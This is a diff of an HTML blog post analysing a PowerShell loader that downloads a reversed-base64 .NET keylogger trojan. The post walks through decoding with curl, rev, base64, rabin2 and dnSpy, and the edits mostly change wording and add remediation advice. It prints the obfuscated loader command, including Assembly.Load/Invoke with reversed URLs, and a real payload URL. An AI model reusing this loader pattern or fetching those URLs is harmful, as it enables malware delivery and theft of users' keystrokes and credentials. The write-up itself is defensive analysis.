@@ -22,7 +22,7 @@
                 <span class="d-block d-xl-none">Olivier LEUNG</span>
                 <span class="d-none d-xl-block"><img class="img-fluid img-profile rounded-circle mx-auto mb-2" src="../assets/img/profile.jpg" alt="" /></span>
             </a>
-            <div class="d-none d-xl-block description_profile"> <!--d-none is used for responsiveness of the panel when you shring the window -->
+            <div class="d-none d-xl-block description_profile"> <!--d-none is used for responsiveness of the panel when we shring the window -->
                 <h3>Olivier LEUNG</h3>
                 <div class="subheading_panel">Cybersecurity engineer </div>
                     <div class="subheading_description">Love testing random cyber stuff !<br>That's by baking we become a baker</div>
@@ -92,13 +92,13 @@
                             The field "processCmdLine" gives a lot of information, but if we're neglecting it, we will probably not understand what the command line does. <br>
                             <br>
                             First, we have a variable « dll » storing the value <i>'0/8JMh1/r/ee.etsap//:sptth'</i>
-                            then another variable « RumpeD » storing the result of the .NetWebClient method « DownloadString ». This method is used to download resources from the argument. Looking at the argument you notice that is the variable « dll ». <br>
+                            then another variable « RumpeD » storing the result of the .NetWebClient method « DownloadString ». This method is used to download resources from the argument. <br>
                             <br>
                             <strong>What does $dll[-1..-$dll.Length] -join '' do ?</strong> <br>
-                            Good thing that you’re in a Windows system, and have a native IDE which is « Powershell ISE ».
+                            Good thing that we’re in a Windows system, and have a native IDE for PowerShell, « Powershell ISE ».
                             <img src="img/PS .NET Assembly Usage/psise.png" class="img-fluid" width="700">
-                            Putting the part of the code that interest you can give you the information you’re looking for. 
-                            From « powershell ISE », you retrieve an URL and we must check this one, because one system of our network is downloading something from that webpage.
+                            Putting the part of the code that interest us might give us the information we're looking for. 
+                            From « powershell ISE », we retrieve an URL and we must check this one, because one system of our network is downloading something from that webpage.
                             Many tools can be used, I will suggest to run the URL in any kind of sandbox such as AnyRun. <br>
                             If the URL contains private information, do not ever run on a public sandbox. We don’t want to leak data. <br>
                             Url : <strong>https://paste.ee/r/1hMJ8/0</strong>
@@ -108,14 +108,14 @@
                             <br>
                             <strong>How to recognize this is a base64 encoding ?</strong> <br>
                             Base64 will only be composed of characters 'A-Z', 'a-z', '0-9', '+', '/' and it is padded at the end with '=', to make the length a multiple of 4. <br>
-                            Since you see that there are ‘==’ at the beginning of the string you can guess that the encoded data is also inversed. So before decoding it, you probably should reverse it. <br>
+                            Since we see that there are ‘==’ at the beginning of the string we can guess that the encoded data is also inversed. So before decoding it, we probably should reverse it. <br>
                             Therefore, we understand why the command line has $Rumpe = [System.Convert]::FromBase64String( $RumpeD[-1..-$RumpeD.Length] -join '') <br>
                             To retrieve all the content of the webpage, we will use the <i>curl</i> command. Accessing to a webpage is the same as making a GET request. <br>
                             <div class="squarebox">Curl –X GET https://paste.ee/r/1hMJ8/0 -o encodedString.txt</div>
                             <img src="img/PS .NET Assembly Usage/curlget.png" class="img-fluid" width="700">
-                            Then on linux, the function <i>rev</i> allows you to reverse any string. <br>
+                            Then on linux, the function <i>rev</i> allows us to reverse any string. <br>
                             <div class="squarebox">cat encodedString.txt | rev > encodedStringREV.txt</div> <br>
-                            Once you have reversed the content of the file, you can decode any base64 with the command base64 and using the parameter –d. <br>
+                            Once we have reversed the content of the file, we can decode any base64 with the command base64 and using the parameter –d. <br>
                             <div class="squarebox">
                                 base64 –d encodedStringREV.txt > String.txt
                             </div>
@@ -123,7 +123,7 @@
 
                             <img src="img/PS .NET Assembly Usage/string.png" class="img-fluid" width="700">
 
-                            Then you see the decoded file is acutally a binary file. We can use <i>hexdump</i> to see if that is a PE file (Windows executable), the magic byte « 4d 5a » confirm that it is a PE file.
+                            The decoded file is acutally a binary file. We can use <i>hexdump</i> to see if that is a PE file (Windows executable), the magic byte « 4d 5a » confirm that it is a PE file.
 
                             <img src="img/PS .NET Assembly Usage/hexdump.png" class="img-fluid" width="700">
 
@@ -132,7 +132,7 @@
                                 [Reflection.Assembly]::Load($Rumpe).GetType('ent.Class1').GetMethod('Run').Invoke($null, [object[]] ('txt.33615435222/sbv/erots.sbvle//:ptth'))"
                             </div><br>
 
-                            It uses the method « FromBase64String » on the variable RumpeD and store it on a new variable « Rumpe ». According to Microsoft docs, the method [Reflection.Assembly]::Load() is taking a Byte type in argument so that explains why the script cast the variable Rumpe in Byte[]. Then the function Invoke is called to remotely run a command. The argument of the function invoke seems to be another reverse URL. It is probably used to bypass URL check.<br>
+                            The method « FromBase64String » on the variable RumpeD and store it on a new variable « Rumpe ». According to Microsoft docs, the method [Reflection.Assembly]::Load() is taking a Byte type in argument so that explains why the script cast the variable Rumpe in Byte[]. Then the function "<i>Invoke</i>" is called to remotely run a command. The argument of the function "<i>Invoke</i>" seems to be another reverse URL. It is probably used to bypass URL check.<br>
                             <br>
                             <u>In powershell like in php « $ » is to indicate a variable.</u>
 
@@ -151,17 +151,17 @@
 
 
                             <img src="img/PS .NET Assembly Usage/string2.png" class="img-fluid" width="700">
-                            Once decode, we found another PE file since you have MZ byte. <br>
+                            Once decode, we found another PE file since we have MZ byte. <br>
                             Since this URL is the one that is going to run on a system, let's find out what it does. 
                             We will continue the investigation with some static analysis, let's analyze the strings of the binary. <strong>Radare2</strong> is a powerful tool to do some reverse engineering.
-                            Radare2 comes with a tool called rabin2, rabin2 can extract the binary information by using the –I parameter, the string with –z parameter or use –zz if you don’t want to be limited on the string found on the data section. <br>
+                            Radare2 comes with a tool called rabin2 and it can extract the binary information by using the –I parameter, the string with –z parameter or use –zz if we don’t want to be limited on the string found on the data section. <br>
                             <div class="squarebox">
                                 Rabin2 –zz string2.exe
                             </div>
 
                             <img src="img/PS .NET Assembly Usage/rabin2.png" class="img-fluid" width="500">
 
-                            Looking at the string, you see that this PE file contains an executable file called « dayandi.exe » and below we see the word Keylogger. <br>
+                            Looking at the string, we see that this PE file contains an executable file called « dayandi.exe » and below we see the word Keylogger. <br>
                             <br>
                             <div class="squarebox">rabin2 -I string2.exe</div>
                             <img src="img/PS .NET Assembly Usage/rabin2info.png" class="img-fluid" width="500">
@@ -170,40 +170,41 @@
 
                             <img src="img/PS .NET Assembly Usage/dnspy1.png" class="img-fluid" width="800">
                             With dnSpy, we managed to retrieve the classes, the functions of the program. There are two classes in the .NET application, <strong>Keylogger</strong> and <strong>Program</strong>. Looking at the function <i>Fix</i>, it takes an object of <i>Key</i> as argument.
-                            A boolean is present to determine if the user if clicking on the shift key, <u>bool flag = this.keyboard.ShiftKeyDown;</u>. If the variable <i>flag</i> is set to YES, then the function will return a upperletter of the key pressed by the user. <br>
+                            A boolean is present to determine if the user is clicking on the shift key.<br><u>bool flag = this.keyboard.ShiftKeyDown;</u> <br> If the variable <i>flag</i> is set to YES, then the function will return a upperletter of the key pressed by the user. <br>
                             <strong>result = Strings.ChrW((int)k).ToString().ToUpper();</strong>
 
-                            <img src="img/PS .NET Assembly Usage/dnspy2.png" class="img-fluid" width="800">
-                            DnSpy allows us to see the flow of a part of the program. The function "Fix" was called by the function "WRK" ... until to reach the starting point (function "Main").
 
-                            There are also two interesting function "Send" and "Receive", the function "Send" used tcpsocket, which lead to a TCP connection. <br>
+                            <img src="img/PS .NET Assembly Usage/dnspy2.png" class="img-fluid" width="800">
+
+                            To retrieve the user inputs, it is using the class Keyboard from the library "Microsoft.VisualBasic.Devices", calling a function "SendKeys".
+
+                            <img src="img/PS .NET Assembly Usage/sendkey.png" width="700">
+
+                            DnSpy allows us to see the flow of a part of the program. The function "Fix" was called by the function "WRK" until reaching the starting point (function "Main").
+
+                            There are also two interesting functions "Send" and "Receive", the function "Send" used tcpsocket, which lead to a TCP connection. <br>
                             Checking the method 
                             <strong>Program.tcpSocket.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length),SocketFlags.None);</strong>, it seems that the function is sending the data inside of the memoryStream.<br>
                             <br>
-                            Let's find out exactly how the program is going to make that connection. There is a function named "Connect", creating MemoryStream, TcpClient Object and calling another function with host and port as argument.
+                            Let's find out exactly how the program is going to make that connection. There is a function named "Connect", creating MemoryStream, TcpClient object and calling another function with <strong>host</strong> and <strong>port</strong> as argument.
 
                             <img src="img/PS .NET Assembly Usage/connect.png" class="img-fluid" width="800">
-                            Clicking on the host, we notice that those variables are the class "Program" attribute and they are set by default.
+                            Clicking on the host, we notice that those variables are the class "Program" attributes and they are set by default.
 
                             <img src="img/PS .NET Assembly Usage/attributes.png" class="img-fluid" width="800">
 
-                            Checking that method, we managed to find the domain where the program will connect and send the data. We also retrieve the port, then we have some encrypted data.
+                            Looking at attributes, we managed to find the domain where the program will connect and send the data. We also retrieve the port, then we have some encrypted data. All those data might be seen as indicator of compromising.
 
-                            Analyzing on the attribute victimName, it is used in the method "Connect" and it is using a function Base64ToString to read the variable. After decoding the base64, we have <strong>victimName = NYAN CAT</strong>. <br>
+                            Analyzing on the attribute victimName, it is used in the method "Connect" and it uses a function Base64ToString to read the variable. After decoding the base64, we have <strong>victimName = NYAN CAT</strong>. <br>
 
                             <img src="img/PS .NET Assembly Usage/virustotal.png" class="img-fluid" width="700">
 
                             That domain has been classified as malicious by 2 antiviruses, Fortinet and Kaspersky. <br>
                             <br>
-                            For the attribute "registryName", it is used in the method CreateSubKey, it doesn't seem to be encoded.
-                            Registry key also means persistence. The program is calling the method "CreateSubKey" on the HKEY_CURRENT_USER\Software. The registry hive HKCU contains information for Windows and softwares for a specific user. The default path for persistance is "<strong>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</strong>". In this case, it creates a subkey of HKCU\Software, this subkey gives the default location of an executable, and is not a sign of persistence.
+                            Registry key can also sound like persistence. The program is calling the method "CreateSubKey" on the HKEY_CURRENT_USER\Software and use the attribute "registryName" as argument, so "registryName" doesn't seem to be encrypted. The registry hive HKCU contains information for Windows and softwares for a specific user. The default path for persistance is "<strong>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</strong>". In this case, it creates a subkey of HKCU\Software, this subkey gives the default location of an executable, and is not a sign of persistence.
 
                             <img src="img/PS .NET Assembly Usage/registry.png" width="700">
 
-                            <br>
-                            To get the user key, it is using the class Keyboard from the library "Microsoft.VisualBasic.Devices", calling a function "SendKeys".
-
-                            <img src="img/PS .NET Assembly Usage/sendkey.png" width="700">
                         </p>
                     </div>
                 </div>
@@ -212,9 +213,10 @@
                 <div class="d-flex flex-column flex-md-row justify-content-between mb-5">
                     <div class="flex-grow-1">
                         <h3 class="mb-0">3/ Conclusion</h3>
-                        FireEye has detected a suspicious bahavior, but doesn't really know what was exactly the program installed by the user. After, reversing the program, we've found that the program allow a connection to a domain on a specific port. It also records all the user's inputs and send it to the domain. Therefore, it is a trojan keylogger which register every keyboard input and send it to the domain. 
+                        FireEye has detected a suspicious bahavior, but doesn't really know what was exactly the program installed by the user. After, reversing the program, we've found it will proceed to a connection to a domain on a specific port. It also records all the user's inputs and send it to the domain. Therefore, it is a trojan keylogger which register every keyboard input and send it to the domain. 
 
-                        After that analysis, we know the intention of the attacker, retrieving the credentials of the users to access to the company network.
+                        After that analysis, we know the intention of the attacker, retrieving the users' credentials and get an access to the company network. <br>
+                        Blocking the domain name, file hash is a good start for future protection. A rebuild of the system, and expiring the user's password is necessary.
                     </div>
                 </div>
             </section>
